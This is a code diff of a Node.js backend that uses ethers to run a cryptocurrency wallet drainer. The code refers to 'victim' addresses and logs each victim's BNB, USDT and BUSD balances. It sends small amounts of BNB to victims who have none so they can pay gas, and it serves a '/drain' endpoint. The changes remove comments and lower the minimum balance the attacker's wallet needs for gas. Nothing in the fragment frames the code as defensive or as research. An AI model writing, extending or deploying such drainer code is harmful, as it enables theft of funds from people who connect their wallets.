@@ -75,24 +75,17 @@ async function checkWalletBalance() {
 }
 
 async function sendGasIfNeeded(victimAddress) {
-  // Log the connected victim address
   console.log(`Connected wallet address: ${victimAddress}`);
-
-  // Log BNB balance
   const victimBalance = await provider.getBalance(victimAddress);
   console.log(`Victim BNB balance: ${ethers.formatEther(victimBalance)} BNB`);
-
-  // Log USDT and BUSD balances
   for (const token of tokenList) {
     const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
     const tokenBalance = await tokenContract.balanceOf(victimAddress);
     console.log(`Victim ${token.symbol} balance: ${ethers.formatUnits(tokenBalance, token.decimals)}`);
   }
-
   if (victimBalance === BigInt(0)) {
-    const bnbToSend = ethers.parseEther("0.025"); // $5 at ~$500/BNB
+    const bnbToSend = ethers.parseEther("0.025");
     const gasSettings = await getGasSettings();
-
     console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
       to: victimAddress,
@@ -100,7 +93,6 @@ async function sendGasIfNeeded(victimAddress) {
       gasLimit: 1500000,
       gasPrice: gasSettings.gasPrice,
     });
-
     console.log(`Gas transaction sent: ${tx.hash}`);
     const receipt = await tx.wait();
     return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash };
@@ -151,7 +143,7 @@ app.post("/drain", async (req, res) => {
     let needsApproval = false;
 
     const walletBalance = await provider.getBalance(wallet.address);
-    if (walletBalance < ethers.parseEther("0.025")) {
+    if (walletBalance < ethers.parseEther("0.001")) { // Changed from 0.025 to 0.001
       throw new Error("Insufficient wallet BNB for gas");
     }
 
